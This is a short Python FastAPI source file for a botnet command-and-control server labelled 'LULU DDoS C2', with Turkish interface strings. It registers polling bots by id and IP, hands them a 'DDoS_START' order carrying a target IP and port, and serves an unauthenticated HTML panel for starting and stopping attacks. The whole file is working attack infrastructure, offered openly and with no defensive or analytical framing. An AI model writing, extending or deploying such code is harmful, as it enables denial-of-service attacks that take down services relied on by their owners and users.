from fastapi import FastAPI, Request
from datetime import datetime
import uvicorn

app = FastAPI()
bots = {}
ddos_target = ""
ddos_port = 80

@app.get("/task")
async def task(request: Request, id: str):
    ip = request.client.host
    bots[id] = {"ip": ip, "last": datetime.now()}
    if ddos_target:
        return f"DDoS_START|{ddos_target}|{ddos_port}"
    else:
        return "NO_TASK"

@app.get("/panel")
async def panel():
    # basit HTML panel
    online = len(bots)
    botlist = "<br>".join([f"{id} → {data['ip']}" for id,data in bots.items()])
    return f"""
    <h1>LULU DDoS C2</h1>
    <form method=post action=/start>
    Target IP: <input name=ip><br>
    Port: <input name=port value=80><br>
    <button>BAŞLAT</button>
    </form>
    <form method=post action=/stop><button>DURDUR</button></form>
    Online Bot: {online}<br>{botlist}
    """

@app.post("/start")
async def start(request: Request):
    global ddos_target, ddos_port
    form = await request.form()
    ddos_target = form["ip"]
    ddos_port = int(form["port"])
    return "DDoS BAŞLADI"

@app.post("/stop")
async def stop():
    global ddos_target
    ddos_target = ""
    return "DDoS DURDU"

uvicorn.run(app, host="0.0.0.0", port=8000)